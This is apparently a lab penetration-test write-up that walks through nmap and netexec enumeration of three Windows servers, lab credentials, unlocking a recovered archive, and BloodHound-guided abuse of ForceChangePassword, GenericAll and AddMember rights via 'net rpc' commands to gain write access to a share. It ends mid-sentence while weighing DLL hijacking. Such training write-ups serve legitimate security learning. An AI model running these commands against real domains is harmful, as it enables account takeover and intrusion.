# Objective and scope
You have been assigned a penetration test of a client's internal network. There are three different servers in-scope. Your task is to identify all vulnerabilities and demonstrate impact to the client by elevating your access to Domain Admin. The client has provided you VPN access and Active Directory credentials (below) for the engagement.

Please note - there are 2 intended paths to compromise this machine. Once you solve it one way, we encourage you to try and solve it a second way.

# Hosts
DC1 - **10.0.16.4**
DC2 - **10.0.18.13**
Nexus - **10.0.27.179**

# Initial Access

The client has provided you with Active Directory credentials and VPN access. `xiao.ge:AmBZATVjnH4qo8H4`

# Host file setup
```python
sudo nxc smb 10.0.16.4 --generate-hosts-file /etc/hosts    
[sudo] password for kali: 
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)


sudo nxc smb 10.0.18.13 --generate-hosts-file /etc/hosts
SMB         10.0.18.13      445    DC2              [*] Windows Server 2022 Build 20348 x64 (name:DC2) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Nexus server - **10.0.27.179**
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.27.179                      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:29 +0100
Nmap scan report for 10.0.27.179
Host is up (0.096s latency).
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
8530/tcp  open  unknown
8531/tcp  open  unknown
49668/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.41 seconds
```

### Nmap
```python
nmap -p 80,135,139,445,3389,8530,8531 -A --min-rate=2000 -sT 10.0.27.179
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:33 +0100
Nmap scan report for 10.0.27.179
Host is up (0.097s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-24T14:34:47+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: EC2AMAZ-GQCP864
|   NetBIOS_Domain_Name: EC2AMAZ-GQCP864
|   NetBIOS_Computer_Name: EC2AMAZ-GQCP864
|   DNS_Domain_Name: EC2AMAZ-GQCP864
|   DNS_Computer_Name: EC2AMAZ-GQCP864
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-24T14:34:08+00:00
| ssl-cert: Subject: commonName=EC2AMAZ-GQCP864
| Not valid before: 2026-02-06T01:27:31
|_Not valid after:  2026-08-08T01:27:31
8530/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Potentially risky methods: TRACE
8531/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## DC2 - **10.0.18.13**
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.18.13 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:34 +0100
Nmap scan report for DC2.dismay.hsm (10.0.18.13)
Host is up (0.096s latency).
Not shown: 65523 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3389/tcp  open  ms-wbt-server
49678/tcp open  unknown
60485/tcp open  unknown
65507/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.88 seconds
```

### Nmap
```python
nmap -p 53,80,135,139,443,445,593,636,3389 -A --min-rate=2000 -sT 10.0.18.13 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:37 +0100
Nmap scan report for DC2.dismay.hsm (10.0.18.13)
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  https?
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: dismay.hsm, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC2.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Not valid before: 2025-12-12T13:39:44
|_Not valid after:  2026-12-12T13:39:44
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-24T14:38:56+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC2.dismay.hsm
| Not valid before: 2025-12-11T12:29:58
|_Not valid after:  2026-06-12T12:29:58
| rdp-ntlm-info: 
|   Target_Name: DISMAY
|   NetBIOS_Domain_Name: DISMAY
|   NetBIOS_Computer_Name: DC2
|   DNS_Domain_Name: dismay.hsm
|   DNS_Computer_Name: DC2.dismay.hsm
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-24T14:38:16+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC2; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## DC1 - **10.0.16.4**
### Open ports
```python
nmap -p- --min-rate=2000 -sT 10.0.16.4 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:38 +0100
Nmap scan report for DC1.dismay.hsm (10.0.16.4)
Host is up (0.096s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49669/tcp open  unknown
51106/tcp open  unknown
51116/tcp open  unknown
51144/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 65.89 seconds
```

### Nmap
```python
nmap -p 53,88,135,139,389,445,3389 -A --min-rate=2000 -sT 10.0.16.4 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 15:41 +0100
Nmap scan report for DC1.dismay.hsm (10.0.16.4)
Host is up (0.095s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-24 14:41:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: dismay.hsm, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC1.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Not valid before: 2025-12-12T13:42:13
|_Not valid after:  2026-12-12T13:42:13
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DISMAY
|   NetBIOS_Domain_Name: DISMAY
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: dismay.hsm
|   DNS_Computer_Name: DC1.dismay.hsm
|   DNS_Tree_Name: dismay.hsm
|   Product_Version: 10.0.20348
|_  System_Time: 2026-04-24T14:41:46+00:00
| ssl-cert: Subject: commonName=DC1.dismay.hsm
| Not valid before: 2025-12-11T11:50:46
|_Not valid after:  2026-06-12T11:50:46
|_ssl-date: 2026-04-24T14:42:26+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 3 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Nexus server (10.0.27.179)
## HTTP (80)
Landing page is a default IIS page!

Nothing interesting out of nuclei

No subdomains

No interesting endpoints

## SMB (445)
```python
nxc smb EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth           
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4
```
This user can authenticate here!

```python
nxc smb EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth --shares
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4 
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [*] Enumerated shares
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  Share           Permissions     Remark
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  -----           -----------     ------
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  ADMIN$                          Remote Admin
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  C$                              Default share
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  IPC$            READ            Remote IPC
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  UpdateServicesPackages READ            A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  WsusContent     READ            A network share to be used by Local Publishing to place published content on this WSUS system.
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

```python
nxc smb EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth --rid-brute 20000       
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (signing:False) (SMBv1:None)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4 
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  500: EC2AMAZ-GQCP864\Administrator (SidTypeUser)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  501: EC2AMAZ-GQCP864\Guest (SidTypeUser)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  503: EC2AMAZ-GQCP864\DefaultAccount (SidTypeUser)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  504: EC2AMAZ-GQCP864\WDAGUtilityAccount (SidTypeUser)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  513: EC2AMAZ-GQCP864\None (SidTypeGroup)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1000: EC2AMAZ-GQCP864\xiao.ge (SidTypeUser)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1001: EC2AMAZ-GQCP864\WSUS Administrators (SidTypeAlias)
SMB         10.0.27.179     445    EC2AMAZ-GQCP864  1002: EC2AMAZ-GQCP864\WSUS Reporters (SidTypeAlias)
```
A lot of references to WSUS which is the service running on port 8530 and 8531

## RDP (3389)
```python
nxc rdp EC2AMAZ-GQCP864 -u 'xiao.ge' -p 'AmBZATVjnH4qo8H4' --local-auth                         
RDP         10.0.27.179     3389   EC2AMAZ-GQCP864  [*] Windows 10 or Windows Server 2016 Build 20348 (name:EC2AMAZ-GQCP864) (domain:EC2AMAZ-GQCP864) (nla:True)
RDP         10.0.27.179     3389   EC2AMAZ-GQCP864  [+] EC2AMAZ-GQCP864\xiao.ge:AmBZATVjnH4qo8H4 (Pwn3d!)
```
As seen here this user can RDP on this server

Ill use RDP to access what is in the shares

![636](Pasted%20image%2020260424160829.png)

UpdateServicesPackages was empty

WsusContent held and empty text file

Also two powershell scripts referencing WSUS once again, no hardcoded credentials

https://www.offsec.com/blog/recent-vulnerabilities-in-wsus-service/

There was a recent CVE discovered that exploits WSUS that i think may work but for now lets keep looking

![528](Pasted%20image%2020260424164809.png)

Also some interesting files in the recycle bin!

![575](Pasted%20image%2020260424165147.png)

Looks like there are some credentials

```python
staging_admin:Spring_2026_Temp!

0xDEADBEEF992211
```

Ill also get the 7z file to my machine by first restoring it then moving it to the SMB share

# Accessing 7zip archive

```python
smbclient //EC2AMAZ-GQCP864/UpdateServicesPackages -U 'xiao.ge'%'AmBZATVjnH4qo8H4'                   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 24 16:54:25 2026
  ..                                  D        0  Tue Mar 10 18:06:38 2026
  Confidential.7z                     A     3754  Fri Apr 17 22:36:33 2026

		7863807 blocks of size 4096. 3238798 blocks available
smb: \> get Confidential.7z 
getting file \Confidential.7z of size 3754 as Confidential.7z (9.6 KiloBytes/sec) (average 9.6 KiloBytes/sec)
smb: \> 
```
Now i have it on my machine i can work on cracking it!

```python
7z2john Confidential.7z | tee 7z.hash
```

So after trying to crack this hash for a while using john i ended up trying to use the password i found above

```python
7z x Confidential.7z                

7-Zip 26.00 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-02-12
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 3754 bytes (4 KiB)

Extracting archive: Confidential.7z
--
Path = Confidential.7z
Type = 7z
Physical Size = 3754
Headers Size = 154
Method = LZMA2:6k 7zAES
Solid = -
Blocks = 1

    
Enter password (will not be echoed):
Everything is Ok

Size:       5359
Compressed: 3754
```
The password `Spring_2026_Temp!` worked to crack the archive

![](Pasted%20image%2020260424171539.png)

```python
guy.rookie:O0Aco9FQJQ
```


# Compromising `guy.rookie`
This user cannot authenticate the nexus server on SMB or RDP

```python
nxc smb dc1.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' 
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.16.4       445    DC1              [+] dismay.hsm\guy.rookie:O0Aco9FQ
```
But the credentials work on the domain controller

## Dumping users
```python
nxc smb dc1.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' --users-export users.txt
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.16.4       445    DC1              [+] dismay.hsm\guy.rookie:O0Aco9FQJQ 
SMB         10.0.16.4       445    DC1              -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.0.16.4       445    DC1              Administrator                 2026-02-05 09:16:49 0       Built-in account for administering the computer/domain 
SMB         10.0.16.4       445    DC1              Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.0.16.4       445    DC1              krbtgt                        2025-12-12 11:50:45 0       Key Distribution Center Service Account 
SMB         10.0.16.4       445    DC1              mike.silver                   2026-02-08 10:39:00 0        
SMB         10.0.16.4       445    DC1              wang.kali                     2026-02-08 10:40:19 0        
SMB         10.0.16.4       445    DC1              nadia.robin                   2026-02-08 10:39:15 0        
SMB         10.0.16.4       445    DC1              jena.yamazaki                 2026-02-08 10:39:30 0        
SMB         10.0.16.4       445    DC1              guy.rookie                    2026-02-08 10:39:43 0        
SMB         10.0.16.4       445    DC1              [*] Enumerated 8 local users: DISMAY
SMB         10.0.16.4       445    DC1              [*] Writing 8 local users to users.txt
```
This new user doesnt have any access on interesting shares on DC1 nor does he have access on RDP to either DC

There was a tools shares on DC1 but no permissions on it!

## Share access on `dc2`
```python
nxc smb dc2.dismay.hsm -u guy.rookie -p 'O0Aco9FQJQ' --shares                              
SMB         10.0.18.13      445    DC2              [*] Windows Server 2022 Build 20348 x64 (name:DC2) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.18.13      445    DC2              [+] dismay.hsm\guy.rookie:O0Aco9FQJQ 
SMB         10.0.18.13      445    DC2              [*] Enumerated shares
SMB         10.0.18.13      445    DC2              Share           Permissions     Remark
SMB         10.0.18.13      445    DC2              -----           -----------     ------
SMB         10.0.18.13      445    DC2              ADMIN$                          Remote Admin
SMB         10.0.18.13      445    DC2              C$                              Default share
SMB         10.0.18.13      445    DC2              CertEnroll      READ            Active Directory Certificate Services share
SMB         10.0.18.13      445    DC2              IPC$            READ            Remote IPC
SMB         10.0.18.13      445    DC2              NETLOGON        READ            Logon server share 
SMB         10.0.18.13      445    DC2              SYSVOL          READ            Logon server share
```
He has read access on CertEnroll 

# Bloodhound
![](Pasted%20image%2020260424173502.png)

This user has ForceChangePassword on `jena.yamazaki`

# Compromising `jena.yamazaki` using ForceChangePassword

```python
net rpc password "jena.yamazaki" 'Password123!' -U "dismay.hsm"/"guy.rookie"%'O0Aco9FQJQ' -S "10.0.16.4"
```
This changed the users password

```python
nxc smb dc1.dismay.hsm -u jena.yamazaki -p 'Password123!'                                               
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.16.4       445    DC1              [+] dismay.hsm\jena.yamazaki:Password123!
```
This user is now compromised

## `jena.yamazaki` outbound object control

![](Pasted%20image%2020260424173945.png)

GenericAll over the user `mike.silver` 

A few options here but once again ill change the users password since this is a lab environment

# Compromising `mike.silver`
```python
net rpc password "mike.silver" 'Password123!' -U "dismay.hsm"/"jena.yamazaki"%'Password123!' -S "10.0.16.4"
```
This changed the users password

```python
nxc smb dc1.dismay.hsm -u mike.silver -p 'Password123!'                                       
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.16.4       445    DC1              [+] dismay.hsm\mike.silver:Password123!
```
This user is now compromised!

## `mike.silver` outbound object control

![819](Pasted%20image%2020260424174354.png)

I have AddMember on the `shares_operators` group

This group has a helpful description

```python
Description:

Operators for share: Tools
```
So adding a member to this should allow some form of access on the tools share i saw earlier on dc1

# Adding `mike.silver` 

```python
net rpc group addmem "shares_operators" "mike.silver" -U "dismay.hsm"/"mike.silver"%'Password123!' -S "10.0.16.4"
```
This should have added the member to the group

```python
net rpc group members "shares_operators" -U "dismay.hsm"/"mike.silver"%'Password123!' -S "10.0.16.4" 
DISMAY\mike.silver
```
I am now in this group

```python
nxc smb dc1.dismay.hsm -u mike.silver -p 'Password123!' --shares
SMB         10.0.16.4       445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:dismay.hsm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.16.4       445    DC1              [+] dismay.hsm\mike.silver:Password123! 
SMB         10.0.16.4       445    DC1              [*] Enumerated shares
SMB         10.0.16.4       445    DC1              Share           Permissions     Remark
SMB         10.0.16.4       445    DC1              -----           -----------     ------
SMB         10.0.16.4       445    DC1              ADMIN$                          Remote Admin
SMB         10.0.16.4       445    DC1              C$                              Default share
SMB         10.0.16.4       445    DC1              IPC$            READ            Remote IPC
SMB         10.0.16.4       445    DC1              NETLOGON        READ            Logon server share 
SMB         10.0.16.4       445    DC1              SYSVOL          READ            Logon server share 
SMB         10.0.16.4       445    DC1              Tools           READ,WRITE
```
So now im part of the group ive inherited read and write over the `tools` share

# `Tools` share
Now mike is a part of the shares_operators group i can access the tools share

```python
smbclient //dc1.dismay.hsm/Tools -U 'mike.silver'%'Password123!'                  
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Apr 24 17:51:59 2026
  ..                                DHS        0  Fri Dec 12 11:58:08 2025
  Dism.exe                            A   329072  Wed May 11 04:46:10 2022
  mspaint.exe                         A   909312  Wed Oct 12 14:48:16 2022
  note.txt                            A      628  Fri Dec 12 12:08:44 2025
  notepad.exe                         A   225280  Wed Jun 15 06:57:15 2022
  osk.exe                             A   708608  Thu Aug 10 05:02:45 2023

		7863807 blocks of size 4096. 3542992 blocks available
smb: \> 
```
Ill look into some of these files and if i find nothing it might be worth trying a watering hole attack abusing my write access

```python
smbclient //dc1.dismay.hsm/Tools -U 'mike.silver'%'Password123!'
Try "help" to get a list of possible commands.
smb: \> prompt off
smb: \> mget *
getting file \Dism.exe of size 329072 as Dism.exe (339.3 KiloBytes/sec) (average 339.3 KiloBytes/sec)
getting file \mspaint.exe of size 909312 as mspaint.exe (862.1 KiloBytes/sec) (average 611.7 KiloBytes/sec)
getting file \note.txt of size 628 as note.txt (1.6 KiloBytes/sec) (average 511.2 KiloBytes/sec)
getting file \notepad.exe of size 225280 as notepad.exe (502.3 KiloBytes/sec) (average 509.8 KiloBytes/sec)
getting file \osk.exe of size 708608 as osk.exe (442.7 KiloBytes/sec) (average 485.8 KiloBytes/sec)
smb: \>
```
Ill transfer all to my machine

```python
cat note.txt 
From: Adrian Thompson <adrian.thompson@dismay.hsm>
To: Kali Wang <wang.kali@dismay.hsm>
Subject: FINAL WARNING - Fix that broken executable NOW

Kali,

This is the third time this month. The binary you deployed last Thursday is completely broken. Users are screaming, auditors are asking questions, and I'm the one getting heat from upstairs. You have until 17:00 tomorrow to deliver a working file or you're done. HR is already on standby. I've had it with your "it works on my machine" excuses.

Get it fixed, push the new file. No more chances.

I'm not bluffing.

- Adrian
IT Security Administrator
DISMAY Ltd.
```

So after attempting analysis on the files here and finding nothing and also attempting to capture NTLM auth using write access i think this may be a rabbit hole!

# Exe analysis
So after transferring `dism.exe` to a windows machine and running it i get an error as it was trying to call a dll called `dismcore.dll`

So it may be possible to attempt DLL hi
